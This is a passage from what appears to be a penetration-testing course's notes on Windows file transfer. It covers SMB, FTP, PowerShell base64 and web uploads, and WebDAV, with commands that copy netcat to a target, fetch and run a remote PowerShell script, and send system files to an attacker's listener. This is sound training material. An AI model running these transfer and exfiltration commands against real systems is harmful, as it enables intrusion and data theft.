</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Impacket v0.9.22 - Copyright <span class=m>2020</span> SecureAuth Corporation
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Config file parsed
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Callback added <span class=k>for</span> UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Callback added <span class=k>for</span> UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Config file parsed
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Config file parsed
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Config file parsed
</span></span></code></pre></td></tr></table></div></div><ul><li>Copy file from SMB server:</li></ul><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-cmd data-lang=cmd><span class=line><span class=cl>C<span class=p>:</span><span class=nl>\htb</span><span class=c1>&gt; copy \\192.168.220.133\share\nc.exe</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        1 file(s) copied.
</span></span></code></pre></td></tr></table></div></div><p>In this case:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-cmd data-lang=cmd><span class=line><span class=cl>C<span class=p>:</span><span class=nl>\htb</span><span class=c1>&gt; copy \\192.168.220.133\share\nc.exe</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>You can&#39;t access this shared folder because your organization&#39;s security policies block unauthenticated guest access. These policies help protect your PC from unsafe or malicious devices on the network.
</span></span></code></pre></td></tr></table></div></div><p>We can set the username and password using the Impacket SMB server and mount it on our windows target machine:</p><ol><li>Create the SMB server with a username and password:</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>Pietra@htb<span class=o>[</span>/htb<span class=o>]</span>$ sudo impacket-smbserver share -smb2support /tmp/smbshare -user <span class=nb>test</span> -password <span class=nb>test</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Impacket v0.9.22 - Copyright <span class=m>2020</span> SecureAuth Corporation
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Config file parsed
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Callback added <span class=k>for</span> UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Callback added <span class=k>for</span> UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Config file parsed
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Config file parsed
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Config file parsed
</span></span></code></pre></td></tr></table></div></div><ol start=2><li>Mount the SMB Server with username and password:</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-cmd data-lang=cmd><span class=line><span class=cl>C<span class=p>:</span><span class=nl>\htb</span><span class=c1>&gt; net use n: \\192.168.220.133\share /user:test test</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>The command completed successfully.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>C<span class=p>:</span><span class=nl>\htb</span><span class=c1>&gt; copy n:\nc.exe</span>
</span></span><span class=line><span class=cl>        1 file(s) copied.
</span></span></code></pre></td></tr></table></div></div><a href=#ftp-downloads><h2 id=ftp-downloads><span class=hanchor arialabel=Anchor># </span>FTP Downloads</h2></a><p>Another way to transfer files is using FTP (File Transfer Protocol), which use port TCP/21 and TCP/20. We can use the FTP client or PowerShell Net.WebClient to download files from an FTP server.</p><p>We can configure an FTP Server in our attack host using Python3 <code>pyftpdlib</code> module. It can be installed with the following command:</p><ul><li>Installing the FTP Server Python3 Module - pyftpdlib</li></ul><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>Pietra@htb<span class=o>[</span>/htb<span class=o>]</span>$ sudo pip3 install pyftpdlib
</span></span></code></pre></td></tr></table></div></div><p>Then we can specify port number 21 because, by default, <code>pyftpdlib</code> uses port 2121. Anonymous authentication is enabled by default if we don&rsquo;t set a user and password.</p><ul><li>Setting up a Python3 FTP Server</li></ul><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>Pietra@htb<span class=o>[</span>/htb<span class=o>]</span>$ sudo python3 -m pyftpdlib --port <span class=m>21</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>I 2022-05-17 10:09:19<span class=o>]</span> concurrency model: async
</span></span><span class=line><span class=cl><span class=o>[</span>I 2022-05-17 10:09:19<span class=o>]</span> masquerade <span class=o>(</span>NAT<span class=o>)</span> address: None
</span></span><span class=line><span class=cl><span class=o>[</span>I 2022-05-17 10:09:19<span class=o>]</span> passive ports: None
</span></span><span class=line><span class=cl><span class=o>[</span>I 2022-05-17 10:09:19<span class=o>]</span> &gt;&gt;&gt; starting FTP server on 0.0.0.0:21, <span class=nv>pid</span><span class=o>=</span><span class=m>3210</span> <span class=o>&lt;&lt;&lt;</span>
</span></span></code></pre></td></tr></table></div></div><p>After the FTP server is set up, we can perform file transfers using the pre-installed FTP client from Windows or PowerShell <code>Net.WebClient</code>.</p><ul><li>Transfering Files from an FTP Server Using PowerShell</li></ul><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=nb>PS </span><span class=n>C:</span><span class=p>\</span><span class=n>htb</span><span class=p>&gt;</span> <span class=p>(</span><span class=nb>New-Object</span> <span class=n>Net</span><span class=p>.</span><span class=n>WebClient</span><span class=p>).</span><span class=n>DownloadFile</span><span class=p>(</span><span class=s1>&#39;ftp://192.168.49.128/file.txt&#39;</span><span class=p>,</span> <span class=s1>&#39;ftp-file.txt&#39;</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>When we get a shell on a remote machine, we may not have an interactive shell. If that&rsquo;s the case, we can create an FTP command file to download a file. First, we need to create a file containing the commands we want to execute and then use the FTP client to use that file to download that file.</p><ul><li>Create a Command File for the FTP Client and Download the Target File</li></ul><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-cmd data-lang=cmd><span class=line><span class=cl>C<span class=p>:</span><span class=nl>\htb</span><span class=c1>&gt; echo open 192.168.49.128 &gt; ftpcommand.txt</span>
</span></span><span class=line><span class=cl>C<span class=p>:</span><span class=nl>\htb</span><span class=c1>&gt; echo USER anonymous &gt;&gt; ftpcommand.txt</span>
</span></span><span class=line><span class=cl>C<span class=p>:</span><span class=nl>\htb</span><span class=c1>&gt; echo binary &gt;&gt; ftpcommand.txt</span>
</span></span><span class=line><span class=cl>C<span class=p>:</span><span class=nl>\htb</span><span class=c1>&gt; echo GET file.txt &gt;&gt; ftpcommand.txt</span>
</span></span><span class=line><span class=cl>C<span class=p>:</span><span class=nl>\htb</span><span class=c1>&gt; echo bye &gt;&gt; ftpcommand.txt</span>
</span></span><span class=line><span class=cl>C<span class=p>:</span><span class=nl>\htb</span><span class=c1>&gt; ftp -v -n -s:ftpcommand.txt</span>
</span></span><span class=line><span class=cl>ftp<span class=p>&gt;</span> open 192.168.49.128
</span></span><span class=line><span class=cl>Log in with USER and PASS first.
</span></span><span class=line><span class=cl>ftp<span class=p>&gt;</span> USER anonymous
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>ftp<span class=p>&gt;</span> GET file.txt
</span></span><span class=line><span class=cl>ftp<span class=p>&gt;</span> bye
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>C<span class=p>:</span><span class=nl>\htb</span><span class=c1>&gt;more file.txt</span>
</span></span><span class=line><span class=cl>This is a test file
</span></span></code></pre></td></tr></table></div></div><a href=#upload-operations><h1 id=upload-operations><span class=hanchor arialabel=Anchor># </span>Upload Operations</h1></a><a href=#powershell-base64-encode-and-decode-1><h2 id=powershell-base64-encode-and-decode-1><span class=hanchor arialabel=Anchor># </span>PowerShell Base64 Encode and Decode</h2></a><ul><li>Encode using PowerShell:</li></ul><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=nb>PS </span><span class=n>C:</span><span class=p>\</span><span class=n>htb</span><span class=p>&gt;</span> <span class=no>[Convert]</span><span class=p>::</span><span class=n>ToBase64String</span><span class=p>((</span><span class=nb>Get-Content</span> <span class=n>-path</span> <span class=s2>&#34;C:\Windows\system32\drivers\etc\hosts&#34;</span> <span class=n>-Encoding</span> <span class=n>byte</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>IyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCiMgVGhpcyBpcyBhIHNhbXBsZSBIT1NUUyBmaWxlIHVzZWQgYnkgTWljcm9zb2Z0IFRDUC9JUCBmb3IgV2luZG93cy4NCiMNCiMgVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBtYXBwaW5ncyBvZiBJUCBhZGRyZXNzZXMgdG8gaG9zdCBuYW1lcy4gRWFjaA0KIyBlbnRyeSBzaG91bGQgYmUga2VwdCBvbiBhbiBpbmRpdmlkdWFsIGxpbmUuIFRoZSBJUCBhZGRyZXNzIHNob3VsZA0KIyBiZSBwbGFjZWQgaW4gdGhlIGZpcnN0IGNvbHVtbiBmb2xsb3dlZCBieSB0aGUgY29ycmVzcG9uZGluZyBob3N0IG5hbWUuDQojIFRoZSBJUCBhZGRyZXNzIGFuZCB0aGUgaG9zdCBuYW1lIHNob3VsZCBiZSBzZXBhcmF0ZWQgYnkgYXQgbGVhc3Qgb25lDQojIHNwYWNlLg0KIw0KIyBBZGRpdGlvbmFsbHksIGNvbW1lbnRzIChzdWNoIGFzIHRoZXNlKSBtYXkgYmUgaW5zZXJ0ZWQgb24gaW5kaXZpZHVhbA0KIyBsaW5lcyBvciBmb2xsb3dpbmcgdGhlIG1hY2hpbmUgbmFtZSBkZW5vdGVkIGJ5IGEgJyMnIHN5bWJvbC4NCiMNCiMgRm9yIGV4YW1wbGU6DQojDQojICAgICAgMTAyLjU0Ljk0Ljk3ICAgICByaGluby5hY21lLmNvbSAgICAgICAgICAjIHNvdXJjZSBzZXJ2ZXINCiMgICAgICAgMzguMjUuNjMuMTAgICAgIHguYWNtZS5jb20gICAgICAgICAgICAgICMgeCBjbGllbnQgaG9zdA0KDQojIGxvY2FsaG9zdCBuYW1lIHJlc29sdXRpb24gaXMgaGFuZGxlZCB3aXRoaW4gRE5TIGl0c2VsZi4NCiMJMTI3LjAuMC4xICAgICAgIGxvY2FsaG9zdA0KIwk6OjEgICAgICAgICAgICAgbG9jYWxob3N0DQo</span><span class=p>=</span>
</span></span><span class=line><span class=cl><span class=nb>PS </span><span class=n>C:</span><span class=p>\</span><span class=n>htb</span><span class=p>&gt;</span> <span class=nb>Get-FileHash</span> <span class=s2>&#34;C:\Windows\system32\drivers\etc\hosts&#34;</span> <span class=n>-Algorithm</span> <span class=n>MD5</span> <span class=p>|</span> <span class=nb>select </span><span class=n>Hash</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>Hash</span>
</span></span><span class=line><span class=cl><span class=p>----</span>
</span></span><span class=line><span class=cl><span class=n>3688374325B992DEF12793500307566D</span>
</span></span></code></pre></td></tr></table></div></div><p>We copy this content and paste it into our attack host, use the <code>base64</code> command to decode it, and use the <code>md5sum</code> application to confirm the transfer happened correctly.</p><ul><li>Decode Base64 String in Linux:</li></ul><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>Pietra@htb<span class=o>[</span>/htb<span class=o>]</span>$ <span class=nb>echo</span> <span class=nv>IyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCiMgVGhpcyBpcyBhIHNhbXBsZSBIT1NUUyBmaWxlIHVzZWQgYnkgTWljcm9zb2Z0IFRDUC9JUCBmb3IgV2luZG93cy4NCiMNCiMgVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBtYXBwaW5ncyBvZiBJUCBhZGRyZXNzZXMgdG8gaG9zdCBuYW1lcy4gRWFjaA0KIyBlbnRyeSBzaG91bGQgYmUga2VwdCBvbiBhbiBpbmRpdmlkdWFsIGxpbmUuIFRoZSBJUCBhZGRyZXNzIHNob3VsZA0KIyBiZSBwbGFjZWQgaW4gdGhlIGZpcnN0IGNvbHVtbiBmb2xsb3dlZCBieSB0aGUgY29ycmVzcG9uZGluZyBob3N0IG5hbWUuDQojIFRoZSBJUCBhZGRyZXNzIGFuZCB0aGUgaG9zdCBuYW1lIHNob3VsZCBiZSBzZXBhcmF0ZWQgYnkgYXQgbGVhc3Qgb25lDQojIHNwYWNlLg0KIw0KIyBBZGRpdGlvbmFsbHksIGNvbW1lbnRzIChzdWNoIGFzIHRoZXNlKSBtYXkgYmUgaW5zZXJ0ZWQgb24gaW5kaXZpZHVhbA0KIyBsaW5lcyBvciBmb2xsb3dpbmcgdGhlIG1hY2hpbmUgbmFtZSBkZW5vdGVkIGJ5IGEgJyMnIHN5bWJvbC4NCiMNCiMgRm9yIGV4YW1wbGU6DQojDQojICAgICAgMTAyLjU0Ljk0Ljk3ICAgICByaGluby5hY21lLmNvbSAgICAgICAgICAjIHNvdXJjZSBzZXJ2ZXINCiMgICAgICAgMzguMjUuNjMuMTAgICAgIHguYWNtZS5jb20gICAgICAgICAgICAgICMgeCBjbGllbnQgaG9zdA0KDQojIGxvY2FsaG9zdCBuYW1lIHJlc29sdXRpb24gaXMgaGFuZGxlZCB3aXRoaW4gRE5TIGl0c2VsZi4NCiMJMTI3LjAuMC4xICAgICAgIGxvY2FsaG9zdA0KIwk6OjEgICAgICAgICAgICAgbG9jYWxob3N0DQo</span><span class=o>=</span> <span class=p>|</span> base64 -d &gt; hosts
</span></span><span class=line><span class=cl>Pietra@htb<span class=o>[</span>/htb<span class=o>]</span>$ md5sum hosts 
</span></span><span class=line><span class=cl>3688374325b992def12793500307566d  hosts
</span></span></code></pre></td></tr></table></div></div><a href=#powershell-web-uploads><h2 id=powershell-web-uploads><span class=hanchor arialabel=Anchor># </span>PowerShell Web Uploads</h2></a><p>PowerShell doesn&rsquo;t have a built-in function for upload operations, but we can use <code>Invoke-WebRequest</code> or <code>Invoke-RestMethod</code> to build our upload function. We&rsquo;ll also need a web server that accepts uploads, which is not a default option in most common webserver utilities.</p><p>For our web server, we can use
<a href=https://github.com/Densaugeo/uploadserver rel=noopener>uploadserver</a>, an extended module of the Python
<a href=https://docs.python.org/3/library/http.server.html rel=noopener>HTTP.server module</a>, which includes a file upload page. Let&rsquo;s install it and start the webserver.</p><ul><li>Installing a configured WebServer with upload:</li></ul><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>Pietra@htb<span class=o>[</span>/htb<span class=o>]</span>$ pip3 install upload server
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Pietra@htb<span class=o>[</span>/htb<span class=o>]</span>$ python3 -m uploadserver
</span></span><span class=line><span class=cl>File upload available at /upload
</span></span><span class=line><span class=cl>Serving HTTP on 0.0.0.0 port <span class=m>8000</span> <span class=o>(</span>http://0.0.0.0:8000/<span class=o>)</span> ...
</span></span></code></pre></td></tr></table></div></div><p>Now we can use a PowerShell script
<a href=https://github.com/juliourena/plaintext/blob/master/Powershell/PSUpload.ps1 rel=noopener>PSUpload.ps1</a> which uses <code>Invoke-WebRequest</code> to perform the upload operations. The script accepts two parameters <code>-File</code>, which we use to specify the file path, and <code>-Uri</code>, the server URL where we&rsquo;ll upload our file. Let&rsquo;s attempt to upload the host file from our Windows host.</p><ul><li>PowerShell script to upload a file to Python upload server:</li></ul><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=nb>PS </span><span class=n>C:</span><span class=p>\</span><span class=n>htb</span><span class=p>&gt;</span> <span class=n>IEX</span><span class=p>(</span><span class=nb>New-Object</span> <span class=n>Net</span><span class=p>.</span><span class=n>WebClient</span><span class=p>).</span><span class=n>DownloadString</span><span class=p>(</span><span class=s1>&#39;https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>PS </span><span class=n>C:</span><span class=p>\</span><span class=n>htb</span><span class=p>&gt;</span> <span class=nb>Invoke-FileUpload</span> <span class=n>-Uri</span> <span class=n>http</span><span class=err>:</span><span class=p>//</span><span class=n>192</span><span class=p>.</span><span class=n>168</span><span class=p>.</span><span class=n>49</span><span class=p>.</span><span class=n>128</span><span class=err>:</span><span class=n>8000</span><span class=p>/</span><span class=n>upload</span> <span class=o>-File</span> <span class=n>C:</span><span class=p>\</span><span class=n>Windows</span><span class=p>\</span><span class=n>System32</span><span class=p>\</span><span class=n>drivers</span><span class=p>\</span><span class=n>etc</span><span class=p>\</span><span class=n>hosts</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>[+]</span> <span class=n>File</span> <span class=n>Uploaded</span><span class=err>:</span>  <span class=n>C:</span><span class=p>\</span><span class=n>Windows</span><span class=p>\</span><span class=n>System32</span><span class=p>\</span><span class=n>drivers</span><span class=p>\</span><span class=n>etc</span><span class=p>\</span><span class=n>hosts</span>
</span></span><span class=line><span class=cl><span class=p>[+]</span> <span class=n>FileHash</span><span class=err>:</span>  <span class=n>5E7241D66FD77E9E8EA866B6278B2373</span>
</span></span></code></pre></td></tr></table></div></div><a href=#powershell-base64-web-upload><h2 id=powershell-base64-web-upload><span class=hanchor arialabel=Anchor># </span>PowerShell Base64 Web Upload</h2></a><p>Another way to use PowerShell and base64 encoded files for upload operations is by using <code>Invoke-WebRequest</code> or <code>Invoke-RestMethod</code> together with Netcat. We use Netcat to listen in on a port we specify and send the file as a <code>POST</code> request. Finally, we copy the output and use the base64 decode function to convert the base64 string into a file.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=nb>PS </span><span class=n>C:</span><span class=p>\</span><span class=n>htb</span><span class=p>&gt;</span> <span class=nv>$b64</span> <span class=p>=</span> <span class=no>[System.convert]</span><span class=p>::</span><span class=n>ToBase64String</span><span class=p>((</span><span class=nb>Get-Content</span> <span class=n>-Path</span> <span class=s1>&#39;C:\Windows\System32\drivers\etc\hosts&#39;</span> <span class=n>-Encoding</span> <span class=n>Byte</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=nb>PS </span><span class=n>C:</span><span class=p>\</span><span class=n>htb</span><span class=p>&gt;</span> <span class=nb>Invoke-WebRequest</span> <span class=n>-Uri</span> <span class=n>http</span><span class=err>:</span><span class=p>//</span><span class=n>192</span><span class=p>.</span><span class=n>168</span><span class=p>.</span><span class=n>49</span><span class=p>.</span><span class=n>128</span><span class=err>:</span><span class=n>8000</span><span class=p>/</span> <span class=n>-Method</span> <span class=n>POST</span> <span class=n>-Body</span> <span class=nv>$b64</span>
</span></span></code></pre></td></tr></table></div></div><p>We catch the base64 data with Netcat and use the base64 application with the decode option to convert the string to the file.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>Pietra@htb<span class=o>[</span>/htb<span class=o>]</span>$ nc -lvnp <span class=m>8000</span>
</span></span><span class=line><span class=cl>Pietra@htb<span class=o>[</span>/htb<span class=o>]</span>$ <span class=nb>echo</span> &lt;base64&gt; <span class=p>|</span> base64 -d -w <span class=m>0</span> &gt; hosts
</span></span></code></pre></td></tr></table></div></div><a href=#smb-uploads><h2 id=smb-uploads><span class=hanchor arialabel=Anchor># </span>SMB Uploads</h2></a><p>We previously discussed that companies usually allow outbound traffic using <code>HTTP</code> (TCP/80) and <code>HTTPS</code> (TCP/443) protocols. Commonly enterprises don&rsquo;t allow the SMB protocol (TCP/445) out of their internal network because this can open them up to potential attacks. For more information on this, we can read the Microsoft post
<a href=https://support.microsoft.com/en-us/topic/preventing-smb-traffic-from-lateral-connections-and-entering-or-leaving-the-network-c0541db7-2244-0dce-18fd-14a3ddeb282a rel=noopener>Preventing SMB traffic from lateral connections and entering or leaving the network</a>.</p><p>An alternative is to run SMB over HTTP with <code>WebDav</code>. <code>WebDAV</code> [RFC 4918](
<a href=https://datatracker.ietf.org/doc/html/rfc4918 rel=noopener>https://datatracker.ietf.org/doc/html/rfc4918</a>|(RFC 4918) is an extension of HTTP, the internet protocol that web browsers and web servers use to communicate with each other. The <code>WebDAV</code> protocol enables a webserver to behave like a fileserver, supporting collaborative content authoring. <code>WebDAV</code> can also use HTTPS.</p><p>When you use <code>SMB</code>, it will first attempt to connect using the SMB protocol, and if there&rsquo;s no SMB share available, it will try to connect using HTTP. In the following Wireshark capture, we attempt to connect to the file share <code>testing3</code>, and because it didn&rsquo;t find anything with <code>SMB</code>, it uses <code>HTTP</code>.</p><p><img src=https://academy.hackthebox.com/storage/modules/24/smb-webdav-wireshark.png width=auto alt=Image></p><a href=#configuring-webdav-server><h3 id=configuring-webdav-server><span class=hanchor arialabel=Anchor># </span>Configuring webdav server</h3></a><p>To set up our WebDav server, we need to install two Python modules, <code>wsgidav</code> and <code>cheroot</code> (you can read more about this implementation here:
<a href=https://github.com/mar10/wsgidav rel=noopener>wsgidav github</a>). After installing them, we run the <code>wsgidav</code> application in the target directory.</p><ul><li>Installing WebDav Python modules:</li></ul><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>Pietra@htb<span class=o>[</span>/htb<span class=o>]</span>$ sudo pip install wsgidav cheroot
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>sudo<span class=o>]</span> password <span class=k>for</span> plaintext: 
</span></span><span class=line><span class=cl>Collecting wsgidav
</span></span><span class=line><span class=cl>  Downloading WsgiDAV-4.0.1-py3-none-any.whl <span class=o>(</span><span class=m>171</span> kB<span class=o>)</span>
</span></span><span class=line><span class=cl>     <span class=p>|</span>â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ<span class=p>|</span> <span class=m>171</span> kB 1.4 MB/s
</span></span><span class=line><span class=cl>     ...SNIP...
</span></span></code></pre></td></tr></table></div></div><ul><li>Using the WebDav Python module:</li></ul><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>Pietra@htb<span class=o>[</span>/htb<span class=o>]</span>$ sudo wsgidav --host<span class=o>=</span>0.0.0.0 --port<span class=o>=</span><span class=m>80</span> --root<span class=o>=</span>/tmp --auth<span class=o>=</span>anonymous 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>sudo<span class=o>]</span> password <span class=k>for</span> plaintext: 
</span></span><span class=line><span class=cl>Running without configuration file.
</span></span><span class=line><span class=cl>10:02:53.949 - WARNING : App wsgidav.mw.cors.Cors<span class=o>(</span>None<span class=o>)</span>.is_disabled<span class=o>()</span> returned True: skipping.
</span></span><span class=line><span class=cl>10:02:53.950 - INFO    : WsgiDAV/4.0.1 Python/3.9.2 Linux-5.15.0-15parrot1-amd64-x86_64-with-glibc2.31
</span></span><span class=line><span class=cl>10:02:53.950 - INFO    : Lock manager:      LockManager<span class=o>(</span>LockStorageDict<span class=o>)</span>
</span></span><span class=line><span class=cl>10:02:53.950 - INFO    : Property manager:  None
</span></span><span class=line><span class=cl>10:02:53.950 - INFO    : Domain controller: SimpleDomainController<span class=o>()</span>
</span></span><span class=line><span class=cl>10:02:53.950 - INFO    : Registered DAV providers by route:
</span></span><span class=line><span class=cl>10:02:53.950 - INFO    :   - <span class=s1>&#39;/:dir_browser&#39;</span>: FilesystemProvider <span class=k>for</span> path <span class=s1>&#39;/usr/local/lib/python3.9/dist-packages/wsgidav/dir_browser/htdocs&#39;</span> <span class=o>(</span>Read-Only<span class=o>)</span> <span class=o>(</span>anonymous<span class=o>)</span>
</span></span><span class=line><span class=cl>10:02:53.950 - INFO    :   - <span class=s1>&#39;/&#39;</span>: FilesystemProvider <span class=k>for</span> path <span class=s1>&#39;/tmp&#39;</span> <span class=o>(</span>Read-Write<span class=o>)</span> <span class=o>(</span>anonymous<span class=o>)</span>
</span></span><span class=line><span class=cl>10:02:53.950 - WARNING : Basic authentication is enabled: It is highly recommended to <span class=nb>enable</span> SSL.
</span></span><span class=line><span class=cl>10:02:53.950 - WARNING : Share <span class=s1>&#39;/&#39;</span> will allow anonymous write access.
</span></span><span class=line><span class=cl>10:02:53.950 - WARNING : Share <span class=s1>&#39;/:dir_browser&#39;</span> will allow anonymous <span class=nb>read</span> access.
</span></span><span class=line><span class=cl>10:02:54.194 - INFO    : Running WsgiDAV/4.0.1 Cheroot/8.6.0 Python 3.9.2
</span></span><span class=line><span class=cl>10:02:54.194 - INFO    : Serving on http://0.0.0.0:80 ...
</span></span></code></pre></td></tr></table></div></div><ul><li>Connecting to the Webdav Share
